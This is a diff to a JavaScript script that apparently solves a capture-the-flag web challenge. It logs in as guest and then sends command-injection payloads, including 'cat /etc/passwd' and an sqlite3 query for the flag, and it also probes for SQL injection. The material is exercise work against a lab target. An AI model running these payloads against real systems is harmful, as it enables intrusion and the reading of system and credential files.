@@ -48,7 +48,7 @@ const commandPayloads = [
   "ls -la",
   
   // Extract the flag from database via command injection
-  "sqlite3 users.db 'SELECT flag_value FROM command_injection_flags WHERE flag_name=\"command_injection\"'",
+  "sqlite3 data/users.db 'SELECT flag_value FROM command_injection_flags WHERE flag_name=\"command_injection\"'",
   
   // Alternative command injection
   "cat /etc/passwd",
@@ -74,8 +74,8 @@ async function testAllVulnerabilities() {
     // First, we need to login to get a token
     console.log('1. Attempting to login...');
     const loginResponse = await axios.post(`${BASE_URL}/api/login`, {
-      username: 'testuser', // Replace with actual username
-      password: 'testpass'  // Replace with actual password
+      username: 'guest',
+      password: 'guest'
     });
     
     authToken = loginResponse.data.token;
@@ -121,9 +121,10 @@ async function testSQLInjection() {
       
       // Check if we got the flag
       if (response.data && Array.isArray(response.data)) {
-        const flagEntry = response.data.find(item => 
-          item.flag_value && item.flag_value.includes('ninja{')
-        );
+        const flagEntry = response.data.find(item => {
+          const fieldsToCheck = ['filename', 'original_name'];
+          return fieldsToCheck.some(key => typeof item[key] === 'string' && item[key].includes('ninja{'));
+        });
         
         if (flagEntry) {
           console.log('   🎉 SQL INJECTION FLAG FOUND! 🎉');
